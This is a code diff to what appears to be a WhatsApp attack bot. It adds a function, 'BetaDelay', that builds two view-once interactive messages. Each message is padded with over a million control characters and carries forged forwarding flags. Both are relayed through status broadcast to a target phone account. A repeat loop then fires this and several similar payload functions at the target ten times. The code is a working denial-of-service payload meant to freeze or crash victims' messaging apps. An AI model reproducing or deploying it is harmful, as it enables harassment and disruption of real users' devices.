@@ -3822,6 +3822,128 @@ async function XtravsBetaXxV2(target, mention) {
     );
   }
 }
+
+async function BetaDelay(sock, target) {
+    let biji = await generateWAMessageFromContent(
+        target,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: " - mexx aree youu okkyy?",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "call_permission_request",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_message",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+                "#" +
+                Math.floor(Math.random() * 16777215)
+                    .toString(16)
+                    .padStart(6, "99999999"),
+        }
+    );
+    
+    let biji2 = await generateWAMessageFromContent(
+        target,
+        {
+            viewOnceMessage: {
+                message: {
+                    interactiveResponseMessage: {
+                        body: {
+                            text: " - mexx whyyy??!",
+                            format: "DEFAULT",
+                        },
+                        nativeFlowResponseMessage: {
+                            name: "galaxy_message",
+                            paramsJson: "\x10".repeat(1045000),
+                            version: 3,
+                        },
+                        entryPointConversionSource: "call_permission_request",
+                    },
+                },
+            },
+        },
+        {
+            ephemeralExpiration: 0,
+            forwardingScore: 9741,
+            isForwarded: true,
+            font: Math.floor(Math.random() * 99999999),
+            background:
+                "#" +
+                Math.floor(Math.random() * 16777215)
+                    .toString(16)
+                    .padStart(6, "99999999"),
+        }
+    );    
+
+    await sock.relayMessage(
+        "status@broadcast",
+        biji.message,
+        {
+            messageId: biji.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );
+    
+    await sock.relayMessage(
+        "status@broadcast",
+        biji2.message,
+        {
+            messageId: biji2.key.id,
+            statusJidList: [target],
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: {},
+                    content: [
+                        {
+                            tag: "mentioned_users",
+                            attrs: {},
+                            content: [
+                                {
+                                    tag: "to",
+                                    attrs: { jid: target },
+                                },
+                            ],
+                        },
+                    ],
+                },
+            ],
+        }
+    );    
+}
 //═══════════//═════════⧼⧼FUNGSI REPEAT⧽⧽═════════//═══════════//
 async function Delayinvisdrayy(target) {
 for (let i = 0; i < 10; i++) {
@@ -3832,7 +3954,6 @@ await XangelDelay3(target, false)
 await XangelDelay3(target, false)
 await XStromDelayNative(target, false)
 await FolwareDelay(target, false)
-await ClaraAudio(sock, target)
 await BulldozerX(target)
 await paymentDelay(target)
 await BetaDelay(sock, target);
